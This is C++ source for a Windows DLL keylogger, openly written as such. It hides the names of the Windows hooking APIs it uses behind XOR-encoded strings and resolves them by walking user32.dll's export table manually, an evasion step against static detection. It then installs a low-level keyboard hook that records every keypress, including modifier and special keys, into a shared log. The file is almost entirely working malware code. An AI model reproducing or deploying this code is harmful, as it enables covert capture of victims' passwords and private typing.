//cl /EHsc /LD .\keylog_k_lib.cpp /link User32.lib
#include <Windows.h>
#include <mutex>
#include <codecvt>
#include <string>
#include <vector>
#define DLL_EXPORT __declspec(dllexport)
#define X_C(c) static_cast<char>((c) ^ 0xFF)
///////////////////////////////////////////////////////////////////////

HMODULE hUser32;
HHOOK k_Hook;
std::vector<std::string>* sharedLogVector = nullptr;
std::mutex logMutex;

///////////////////////////////////////////////////////////////////////
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void* FindExportAddress(HMODULE hModule, const char* funcName);
///////////////////////////////////////////////////////////////////////

typedef HHOOK(WINAPI *Set_WinHuk_Fn)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL(WINAPI *Un_huk_WinHuk_ExFn)(HHOOK);
typedef LRESULT(WINAPI *Call_NxtHuk_ExFn)(HHOOK, int, WPARAM, LPARAM);
typedef BOOL(WINAPI *Get_Kbd_Stt_Fn)(PBYTE);
typedef int(WINAPI *To_Unicode_Fn)(UINT, UINT, PBYTE, LPWSTR, int, UINT);

Set_WinHuk_Fn My_Set_WinDows_Huk_ExA;
Un_huk_WinHuk_ExFn My_Unhuk_WinDows_Huk_Ex;
Call_NxtHuk_ExFn My_Call_Nxt_Huk_Ex;
Get_Kbd_Stt_Fn My_Get_Kbd_Stt;
To_Unicode_Fn My_ToUnicode;
///////////////////////////////////////////////////////////////////////

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);

        }
    }
    MessageBoxA(NULL, "Failed to find export address" , "Error", MB_OK);
    return nullptr;

}

DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
{

    char obf_Usr_32[] = { X_C('u'), X_C('s'), X_C('e'), X_C('r'), X_C('3'), X_C('2'), X_C('.'), X_C('d'), X_C('l'), X_C('l'), '\0'};
    char obf_Set_Win_Huk_ExA[] = { X_C('S'), X_C('e'), X_C('t'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), X_C('A'), '\0' };
    char obf_Unhuk_Win_Huk_Ex[] = { X_C('U'), X_C('n'), X_C('h'), X_C('o'), X_C('o'), X_C('k'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
    char obf_Cal_NxtHuk_Ex[] = { X_C('C'), X_C('a'), X_C('l'), X_C('l'), X_C('N'), X_C('e'), X_C('x'), X_C('t'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
    char obf_Get_Kbd_Stt[] = { X_C('G'), X_C('e'), X_C('t'), X_C('K'), X_C('e'), X_C('y'), X_C('b'), X_C('o'), X_C('a'), X_C('r'), X_C('d'), X_C('S'), X_C('t'), X_C('a'), X_C('t'), X_C('e'), '\0' };
    char obf_To_Unicode[] = { X_C('T'), X_C('o'), X_C('U'), X_C('n'), X_C('i'), X_C('c'), X_C('o'), X_C('d'), X_C('e'), '\0' };

    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= 0xFF;
    for (int i = 0; obf_Set_Win_Huk_ExA[i] != '\0'; i++) obf_Set_Win_Huk_ExA[i] ^= 0xFF;
    for (int i = 0; obf_Unhuk_Win_Huk_Ex[i] != '\0'; i++) obf_Unhuk_Win_Huk_Ex[i] ^= 0xFF;
    for (int i = 0; obf_Cal_NxtHuk_Ex[i] != '\0'; i++) obf_Cal_NxtHuk_Ex[i] ^= 0xFF;
    for (int i = 0; obf_Get_Kbd_Stt[i] != '\0'; i++) obf_Get_Kbd_Stt[i] ^= 0xFF;
    for (int i = 0; obf_To_Unicode[i] != '\0'; i++) obf_To_Unicode[i] ^= 0xFF;


    hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
    My_Set_WinDows_Huk_ExA = (Set_WinHuk_Fn)FindExportAddress(hUser32, obf_Set_Win_Huk_ExA);
    My_Unhuk_WinDows_Huk_Ex = (Un_huk_WinHuk_ExFn)FindExportAddress(hUser32, obf_Unhuk_Win_Huk_Ex);
    My_Call_Nxt_Huk_Ex = (Call_NxtHuk_ExFn)FindExportAddress(hUser32, obf_Cal_NxtHuk_Ex);
    My_Get_Kbd_Stt = (Get_Kbd_Stt_Fn)FindExportAddress(hUser32, obf_Get_Kbd_Stt);
    My_ToUnicode = (To_Unicode_Fn)FindExportAddress(hUser32, obf_To_Unicode);


    SecureZeroMemory(obf_Usr_32, sizeof(obf_Usr_32));
    SecureZeroMemory(obf_Set_Win_Huk_ExA, sizeof(obf_Set_Win_Huk_ExA));
    SecureZeroMemory(obf_Unhuk_Win_Huk_Ex, sizeof(obf_Unhuk_Win_Huk_Ex));
    SecureZeroMemory(obf_Cal_NxtHuk_Ex, sizeof(obf_Cal_NxtHuk_Ex));
    SecureZeroMemory(obf_Get_Kbd_Stt, sizeof(obf_Get_Kbd_Stt));
    SecureZeroMemory(obf_To_Unicode, sizeof(obf_To_Unicode));

    sharedLogVector = logVector;  
    k_Hook = My_Set_WinDows_Huk_ExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
}

DLL_EXPORT void Cleanup()
{
    if (k_Hook) 
    {
        My_Unhuk_WinDows_Huk_Ex(k_Hook);
        FreeLibrary(hUser32);
        k_Hook = nullptr;
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* k_Info = (KBDLLHOOKSTRUCT*)lParam;
        BYTE k_State[256];
        My_Get_Kbd_Stt(k_State);
        WCHAR outputChar[2] = { 0 };

        {
            std::lock_guard<std::mutex> lock(logMutex);
            switch (wParam) // Switch on wParam (message type)
            {
                case WM_KEYDOWN:
                case WM_SYSKEYDOWN:
                {
                    switch (k_Info->vkCode)
                    {
                        case VK_LSHIFT:
                        case VK_RSHIFT:
                            sharedLogVector->emplace_back("[Shift Pressed] ");
                            break;
                        case VK_LCONTROL:
                        case VK_RCONTROL:
                            sharedLogVector->emplace_back("[Control]");
                            break;
                        case VK_LMENU:
                        case VK_RMENU:
                            sharedLogVector->emplace_back("[Alt] ");
                            break;
                        case VK_CAPITAL:
                            sharedLogVector->emplace_back("[Caps Lock] ");
                            break;
                        case VK_BACK:
                            sharedLogVector->emplace_back("[Backspace]");
                            break;
                        case VK_TAB:
                            sharedLogVector->emplace_back("[Tab] ");
                            break;
                        case VK_ESCAPE:
                            sharedLogVector->emplace_back("[Escape] ");
                            break;
                        case VK_RETURN:
                            sharedLogVector->emplace_back("[Enter] ");
                            break;
                        case VK_SPACE:
                            sharedLogVector->emplace_back("[Space]");
                            break;
                        case VK_LEFT:
                            sharedLogVector->emplace_back("[<-] ");
                            break;
                        case VK_RIGHT:
                            sharedLogVector->emplace_back("[->] ");
                            break;
                        case VK_UP:
                            sharedLogVector->emplace_back("[Up Arrow] ");
                            break;
                        case VK_DOWN:
                            sharedLogVector->emplace_back("[Down Arrow] ");
                            break;
                        case VK_DELETE:
                            sharedLogVector->emplace_back("[Del] ");
                            break;
                        case VK_INSERT:
                            sharedLogVector->emplace_back("[Ins] ");
                            break;
                        case VK_LWIN:
                        case VK_RWIN:
                            sharedLogVector->emplace_back("[Windows] ");
                            break;
                        case VK_NUMPAD0:
                            sharedLogVector->emplace_back("[NumPad 0] ");
                            break;
                        case VK_NUMPAD1:
                            sharedLogVector->emplace_back("[NumPad 1] ");
                            break;
                        case VK_NUMPAD2:
                            sharedLogVector->emplace_back("[NumPad 2] ");
                            break;
                        case VK_NUMPAD3:
                            sharedLogVector->emplace_back("[NumPad 3] ");
                            break;
                        case VK_NUMPAD4:
                            sharedLogVector->emplace_back("[NumPad 4] ");
                            break;
                        case VK_NUMPAD5:
                            sharedLogVector->emplace_back("[NumPad 5] ");
                            break;
                        case VK_NUMPAD6:
                            sharedLogVector->emplace_back("[NumPad 6] ");
                            break;
                        case VK_NUMPAD7:
                            sharedLogVector->emplace_back("[NumPad 7] ");
                            break;
                        case VK_NUMPAD8:
                            sharedLogVector->emplace_back("[NumPad 8] ");
                            break;
                        case VK_NUMPAD9:
                            sharedLogVector->emplace_back("[NumPad 9] ");
                            break;
                        case VK_MULTIPLY:
                            sharedLogVector->emplace_back("[NumPad Multiply] ");
                            break;
                        case VK_ADD:
                            sharedLogVector->emplace_back("[NumPad Add] ");
                            break;
                        case VK_SEPARATOR:
                            sharedLogVector->emplace_back("[NumPad Separator] ");
                            break;
                        case VK_SUBTRACT:
                            sharedLogVector->emplace_back("[NumPad Subtract] ");
                            break;
                        case VK_DECIMAL:
                            sharedLogVector->emplace_back("[NumPad Decimal] ");
                            break;
                        case VK_DIVIDE:
                            sharedLogVector->emplace_back("[NumPad Divide] ");
                            break;
                        case VK_HOME:
                            sharedLogVector->emplace_back("[Home] ");
                            break;
                        case VK_END:
                            sharedLogVector->emplace_back("[End] ");
                            break;
                        case VK_PRIOR:
                            sharedLogVector->emplace_back("[Pg_up] ");
                            break;
                        case VK_NEXT:
                            sharedLogVector->emplace_back("[Pg_down] ");
                            break;
                        case VK_NUMLOCK:
                            sharedLogVector->emplace_back("[Numlock] ");
                            break;
                        case VK_SNAPSHOT:
                            sharedLogVector->emplace_back("[Print_scr] ");
                            break;
                        default:
                        {
                            int result = My_ToUnicode(k_Info->vkCode, k_Info->scanCode, k_State, outputChar, 1, 0);
                            if (result == 1)
                            {
                                std::string utf8Char(1, (char)outputChar[0]); 
                                sharedLogVector->emplace_back(utf8Char);
                            }
                            else if (result > 1)
                            { 
                                outputChar[result] = L'\0';
                                std::string utf8Char = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(outputChar);
                                sharedLogVector->emplace_back(utf8Char);
                            } 
                            else sharedLogVector->emplace_back("[unknown] ");
                            
                            break;
                        }
                    }
                    break;
                }
                case WM_KEYUP:
                case WM_SYSKEYUP: // Handle system key ups
                {   
                    switch (k_Info->vkCode)
                    {
                        case VK_LSHIFT:
                        case VK_RSHIFT:
                        {
                            sharedLogVector->emplace_back("[Shift Released] ");
                            break;
                        }
                    }
                    break;
                }
            }
        }
    }

    return My_Call_Nxt_Huk_Ex(k_Hook, nCode, wParam, lParam);
}